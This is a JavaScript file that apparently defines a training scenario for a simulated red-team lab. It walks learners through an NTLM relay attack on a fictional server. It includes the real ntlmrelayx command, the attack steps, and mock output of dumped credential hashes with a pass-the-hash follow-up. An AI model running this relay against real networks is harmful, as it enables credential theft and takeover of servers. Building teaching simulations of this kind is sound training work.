/**
 * Mission 4B: NTLM Relay Attack
 *
 * This scenario simulates relaying a captured NTLM hash (from LLMNR)
 * to a vulnerable server to gain access.
 *
 * THIS SCENARIO ASSUMES:
 * 1. The user has captured the 'b.user' NTLMv2 hash from the
 * LLMNR Poisoning mission.
 * 2. The target server 'SQL01' (10.0.1.20) has SMB Signing disabled.
 */

export const ntlmRelayScenario = {
  id: 'ntlm-relay',
  title: 'NTLM Relay: Abusing Authentication',
  description: 'Relay a captured NTLM hash to a server with SMB signing disabled to gain a shell.',
  difficulty: 'Advanced',

  network: {
    attacker: {
      ip: '10.0.0.5',
      hostname: 'kali-attacker',
      role: 'Red Team Machine'
    },
    target: {
      ip: '10.0.1.20', // Our target is the SQL server
      hostname: 'SQL01.contoso.local',
      role: 'Internal Server'
    },
    domain: 'contoso.local'
  },

  guide: {
    overview: `**NTLM Relay** is a powerful man-in-the-middle attack that intercepts an authentication attempt (like one from LLMNR) and relays it to a target server.

**Attack Flow:**
1.  Identify a target server with **SMB Signing disabled**. (We'll assume 'SQL01' at 10.0.1.20 is vulnerable).
2.  Run 'ntlmrelayx.py' to listen for hashes and relay them to the target.
3.  (Simulate 'Responder' capturing another hash and forwarding it to ntlmrelayx).
4.  If the user ('b.user') has admin rights on the target ('SQL01'), the relay will succeed and grant you a shell.

**Why This Matters:**
This attack bypasses the need to crack the hash. If the user has high privileges and the server is misconfigured, this attack provides an instant shell.`,
    steps: [
      {
        number: 1,
        title: 'Run ntlmrelayx',
        description:
          'Start the \'ntlmrelayx.py\' tool. We will target the SQL01 server (10.0.1.20) which we know has SMB signing disabled.',
        command: 'ntlmrelayx.py -t smb://10.0.1.20',
        tip:
          'This tool sets up a listener to catch authentication attempts and forward them to the target.'
      },
      {
        number: 2,
        title: 'Receive Relayed Hash',
        description:
          'Another user ("b.user") has attempted to access a poisoned share. Responder has captured and forwarded their authentication to ntlmrelayx!',
        command: null, // This step will auto-run
        tip: 'The NTLMv2 hash for "b.user" is being used in real-time.'
      },
      {
        number: 3,
        title: 'Shell Gained!',
        description:
          'Success! The user "b.user" was a local admin on SQL01. The relay was successful, and ntlmrelayx has dumped the local hashes.',
        command: null,
        tip: 'You have compromised the SQL01 server and have the local administrator hash!'
      }
    ]
  },

  // Simulation steps executed in the terminal
  steps: [
    {
      id: 1,
      expectedCommand: 'ntlmrelayx.py -t smb://10.0.1.20',
      attackerOutput: [
        '[*] Impacket NTLM Relayx',
        '[*] Setting up SMB server on 10.0.0.5:445...',
        '[*] Setting up HTTP server on 10.0.0.5:80...',
        '[*] Relaying authentication to target: smb://10.0.1.20',
        '[*] Waiting for connections...'
      ],
      serverOutput: [
        '[NET] Attacker (10.0.0.5) has opened SMB/HTTP listeners.',
        '[AUDIT] Network listeners active.'
      ],
      delay: 500
    },
    {
      id: 2,
      expectedCommand: null, // Auto-advances after a delay
      attackerOutput: [
        '[*] Received connection from 10.0.1.50 (Victim PC)',
        '[*] Authenticating as CONTOSO\\b.user to smb://10.0.1.20',
        '[+] Authentication successful! User b.user is an ADMIN on 10.0.1.20!',
        '[+] Dumping LSA secrets...',
        'Administrator:500:aad3b...:5f4dcc3b5aa765d61d8327deb882cf99:::',
        'Guest:501:aad3b...:31d6cfe0d16ae931b73c59d7e0c089c0:::',
        'svc_admin:1001:aad3b...:8846f7eaee8fb117ad06bdd830b7586c:::',
        '[+] Hashes saved to loot directory.'
      ],
      serverOutput: [
        '[NET] 10.0.1.50 -> 10.0.0.5 (SMB Auth Request for b.user)',
        '[NET] 10.0.0.5 -> 10.0.1.20 (SMB Auth RELAY for b.user)',
        '[SMB] Authentication for CONTOSO\\b.user from 10.0.0.5 SUCCEEDED on SQL01 (10.0.1.20)',
        '[LSA] LSA secrets accessed by authenticated user "b.user".',
        '[ALERT] CRITICAL: NTLM Relay attack detected! Host 10.0.1.20 compromised.'
      ],
      delay: 1500 // Simulates waiting for a user
    },
    {
      id: 3,
      expectedCommand: null,
      attackerOutput: [
        '',
        '[+] ============================================',
        '[+] NTLM Relay Complete',
        '[+] ============================================',
        '[+] Credentials Found: 3 (From SQL01)',
        '[+] User: Administrator',
        '[+] Hash: 5f4dcc3b5aa765d61d8327deb882cf99',
        '[+] ============================================',
        '[*] Next Steps:',
        '[*] 1. Use the "Administrator" hash to Pass-the-Hash.',
        '[*] 2. This hash is now in your "Files" tab.',
        '',
        '[+] Attack successful! 🎯'
      ],
      serverOutput: [
        '[INFO] Attacker has gained administrative hashes from SQL01.'
      ],
      delay: 400,
      // --- NEW: This step adds the new admin hash to our loot! ---
      lootToGrant: {
        creds: [
          { type: 'Hash', username: 'admin', secret: '5f4dcc3b5aa765d61d8327deb882cf99' }
        ]
      }
    }
  ]
};

export default ntlmRelayScenario;